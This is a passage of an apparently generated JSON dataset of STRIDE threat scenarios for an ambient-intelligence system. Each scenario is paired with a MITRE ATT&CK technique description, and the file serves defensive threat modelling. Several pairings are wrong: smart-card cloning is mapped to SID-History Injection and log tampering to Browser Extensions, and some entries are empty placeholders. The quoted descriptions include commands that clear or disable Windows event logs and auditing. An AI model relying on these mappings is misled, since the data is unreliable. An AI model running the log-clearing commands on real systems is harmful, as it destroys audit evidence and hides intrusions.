automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
                "technique_id": "T1598"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen user credentials (passwords or pins) to gain access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Password database is vulnerable to breach.",
                    "Role": "System Administrator",
                    "Condition": "Weak or unpatched system vulnerabilities."
                },
                {
                    "Assumption": "Users reuse passwords across multiple systems.",
                    "Role": "User",
                    "Condition": "Lack of user education and company policies."
                },
                {
                    "Assumption": "No multi-factor authentication is enforced.",
                    "Role": "Security Policy Maker",
                    "Condition": "System configuration lacks enforcement of extra security layers."
                }
            ],
            "Potential Impact": "Compromise of system integrity and unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "password",
                "pin",
                "system breach"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker clone a smart card or hardware token to mimic a legitimate user device.",
            "Assumptions": [
                {
                    "Assumption": "Smart card or token can be physically accessed by the attacker.",
                    "Role": "User",
                    "Condition": "Poor physical security practices."
                },
                {
                    "Assumption": "Smart card or token communication is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Insecure communication protocols."
                },
                {
                    "Assumption": "Smart cards or tokens are not periodically updated or replaced.",
                    "Role": "IT Manager",
                    "Condition": "Lack of hardware lifecycle management."
                }
            ],
            "Potential Impact": "Unauthorized access to critical system functions.",
            "MITRE ATT&CK Keywords": [
                "cloning",
                "smart card",
                "token",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates sensor data to make the system believe incorrect environmental conditions.",
            "Assumptions": [
                {
                    "Assumption": "Access to sensor data transmission is possible.",
                    "Role": "Attacker",
                    "Condition": "Insecure network communication paths."
                },
                {
                    "Assumption": "Sensors lack tamper-evident mechanisms.",
                    "Role": "Hardware Developer",
                    "Condition": "Sensors are not designed with physical security in mind."
                },
                {
                    "Assumption": "No integrity checks on sensor data.",
                    "Role": "Software Developer",
                    "Condition": "Lack of data validation protocols."
                }
            ],
            "Potential Impact": "System makes incorrect decisions, endangering user safety and comfort.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "sensor tampering",
                "network attack",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies actuator commands to execute unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure command protocol.",
                    "Role": "System Architect",
                    "Condition": "Actuators accept unauthenticated commands."
                },
                {
                    "Assumption": "Network traffic is unencrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Use of insecure communication protocols."
                },
                {
                    "Assumption": "Actuators do not verify the origin of commands.",
                    "Role": "Firmware Developer",
                    "Condition": "Firmware does not have built-in source validation."
                }
            ],
            "Potential Impact": "Physical actions in the environment causing safety risks.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "actuator",
                "unauthorized action",
                "control bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters AI/ML model training data to skew system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can access training datasets.",
                    "Role": "Data Engineer",
                    "Condition": "Training data is improperly secured."
                },
                {
                    "Assumption": "No rigorous validation of training data sources.",
                    "Role": "AI/ML Developer",
                    "Condition": "Lack of strong data provenance and source validation."
                },
                {
                    "Assumption": "Continuous learning system is unsupervised.",
                    "Role": "System Engineer",
                    "Condition": "Absence of human oversight in the learning loop."
                }
            ],
            "Potential Impact": "System operates based on faulty or biased intelligence, reducing efficiency and effectiveness.",
            "MITRE ATT&CK Keywords": [
                "model poisoning",
                "AI/ML",
                "data integrity",
                "system bias"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies actions that they performed which are not logged precisely.",
            "Assumptions": [
                {
                    "Assumption": "System lacks comprehensive logging.",
                    "Role": "Log Manager",
                    "Condition": "Logging mechanisms are not properly implemented."
                },
                {
                    "Assumption": "Logs are prone to tampering.",
                    "Role": "Security Engineer",
                    "Condition": "Logs are not tamper-proof or not securely stored."
                },
                {
                    "Assumption": "No regular log audits.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of logging oversight and inspection."
                }
            ],
            "Potential Impact": "Difficulty in establishing accountability and understanding actions taken.",
            "MITRE ATT&CK Keywords": [
                "action denial",
                "log manipulation",
                "audit",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies log files to erase traces of their activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not write-protected.",
                    "Role": "System Administrator",
                    "Condition": "Logs are accessible for modification."
                },
                {
                    "Assumption": "Insufficient monitoring of log integrity.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of automated integrity checks."
                },
                {
                    "Assumption": "Log storage lacks redundancy.",
                    "Role": "IT Architect",
                    "Condition": "Single point of failure without backup mechanisms."
                }
            ],
            "Potential Impact": "Evasion of detection and accountability.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "evasion",
                "data modification",
                "tracking"
            ],
            "mitre_technique": {
                "name": "Browser Extensions",
                "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) ",
                "id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8",
                "technique_id": "T1176"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving a command or not being notified by the system.",
            "Assumptions": [
                {
                    "Assumption": "No confirmation system for critical alerts.",
                    "Role": "System Designer",
                    "Condition": "Design oversight leads to lack of user acknowledgment mechanisms."
                },
                {
                    "Assumption": "Communication logs are not maintained.",
                    "Role": "Log Manager",
                    "Condition": "No systematic logging of alerts and notifications."
                },
                {
                    "Assumption": "System lacks end-to-end encryption.",
                    "Role": "Security Engineer",
                    "Condition": "Communications can be intercepted or altered."
                }
            ],
            "Potential Impact": "Claims of notifications not being received, causing security lapses.",
            "MITRE ATT&CK Keywords": [
                "notification denial",
                "command receipt",
                "user alert",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted sensor data containing user biometrics.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is not encrypted during transmission.",
                    "Role": "System Architect",
                    "Condition": "Use of insecure transmission protocols."
                },
                {
                    "Assumption": "Network traffic is monitorable by attackers.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of secure network zoning and monitoring."
                },
                {
                    "Assumption": "Biometric data is stored in plaintext.",
                    "Role": "Database Administrator",
                    "Condition": "Inadequate data storage encryption policies."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive biometric information.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted data",
                "biometric",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Remote Email Collection",
                "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
                "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
                "technique_id": "T1114.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to historical data stored in cloud repositories.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage credentials are compromised.",
                    "Role": "Cloud Security Manager",
                    "Condition": "Weak credential management practices."
                },
                {
                    "Assumption": "No encryption of data at rest.",
                    "Role": "Database Administrator",
                    "Condition": "Storage policies lack encryption enforcement."
                },
                {
                    "Assumption": "Cloud storage provider lacks adequate security controls.",
                    "Role": "Compliance Officer",
                    "Condition": "Poor due diligence during provider selection."
                }
            ],
            "Potential Impact": "Exposure of sensitive historical user data.",
            "MITRE ATT&CK Keywords": [
                "cloud breach",
                "data theft",
                "historical data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal user with excessive privileges leaks sensitive configuration details.",
            "Assumptions": [
                {
                    "Assumption": "Privileged users have unrestricted data access.",
                    "Role": "Access Manager",
                    "Condition": "Lack of principle of least privilege."
                },
                {
                    "Assumption": "No monitoring of privileged user activities.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of user activity monitoring tools."
                },
                {
                    "Assumption": "Insider threat detection mechanisms are weak.",
                    "Role": "HR and Security Team",
                    "Condition": "Lack of behavioral analytics and detection systems."
                }
            ],
            "Potential Impact": "Disclosure of critical system configuration details, aiding attackers.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leak",
                "privilege misuse",
                "configuration exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads the communication network, disrupting data exchange.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks adequate traffic filtering.",
                    "Role": "Network Administrator",
                    "Condition": "No use of DDoS protection mechanisms."
                },
                {
                    "Assumption": "System cannot handle high traffic volumes.",
                    "Role": "System Architect",
                    "Condition": "Insufficient network capacity planning."
                },
                {
                    "Assumption": "No redundancy in network paths.",
                    "Role": "Network Engineer",
                    "Condition": "Single point of failure in network layout."
                }
            ],
            "Potential Impact": "Disruption of system functionality and user access.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network overload",
                "traffic flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection on user devices leading to system-wide downtime.",
            "Assumptions": [
                {
                    "Assumption": "Users install unvetted applications.",
                    "Role": "User",
                    "Condition": "Lack of user education on safe practices."
                },
                {
                    "Assumption": "Endpoints lack malware protection.",
                    "Role": "IT Security",
                    "Condition": "No antivirus or endpoint protection solutions."
                },
                {
                    "Assumption": "System has inadequate containment strategies.",
                    "Role": "Incident Response Team",
                    "Condition": "Weak or non-existent malware containment plans."
                }
            ],
            "Potential Impact": "System becomes inoperative due to widespread infection.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "infection",
                "endpoint security",
                "system downtime"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in IoT devices to crash critical system services.",
            "Assumptions": [
                {
                    "Assumption": "Device firmware is outdated with known vulnerabilities.",
                    "Role": "Device Manager",
                    "Condition": "Inadequate update and patch management practices."
                },
                {
                    "Assumption": "No anomaly detection within device communications.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of advanced threat detection solutions."
                },
                {
                    "Assumption": "Network segmentation is not implemented.",
                    "Role": "Network Engineer",
                    "Condition": "Flat network topology without isolation."
                }
            ],
            "Potential Impact": "Critical system functions are disrupted, leading to service unavailability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "IoT devices",
                "system crash",
                "service failure"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in system firmware to gain admin privileges.",
            "Assumptions": [
                {
                    "Assumption": "Firmware has unpatched vulnerabilities.",
                    "Role": "Firmware Developer",
                    "Condition": "Insufficient vulnerability management and updates."
                },
                {
                    "Assumption": "System lacks proper role-based access control.",
                    "Role": "System Architect",
                    "Condition": "Weak access control implementations."
                },
                {
                    "Assumption": "No monitoring of administrative activities.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of activity logging and alerting for admin actions."
                }
            ],
            "Potential Impact": "Gain of unauthorized administrative control, compromising system security.",
            "MITRE ATT&CK Keywords": [
                "zero-day",
                "firmware",
                "admin privileges",
                "access control"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick users into executing commands with elevated permissions.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Lack of security awareness training."
                },
                {
                    "Assumption": "Command execution lacks sufficient verification.",
                    "Role": "System Administrator",
                    "Condition": "Commands can be executed without stringent validation."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) for executing critical commands.",
                    "Role": "Security Architect",
                    "Condition": "System lacks enforcement of MFA."
                }
            ],
            "Potential Impact": "Execution of unauthorized tasks, leading to potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "phishing",
                "command execution",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits insecure API endpoints to gain higher access levels within the system.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack proper access control mechanisms.",
                    "Role": "API Developer",
                    "Condition": "Ineffective access controls in API design."
                },
                {
                    "Assumption": "APIs are exposed to the internet without adequate security.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient API exposure management."
                },
                {
                    "Assumption": "API usage is not monitored or logged.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of API activity monitoring and logging."
                }
            ],
            "Potential Impact": "Unauthorized access to system functionalities and potential data breach.",
            "MITRE ATT&CK Keywords": [
                "API exploitation",
                "access control",
                "higher access",
                "endpoint security"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker clones a user's biometric data to gain unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is stored locally on user devices",
                    "Role": "User",
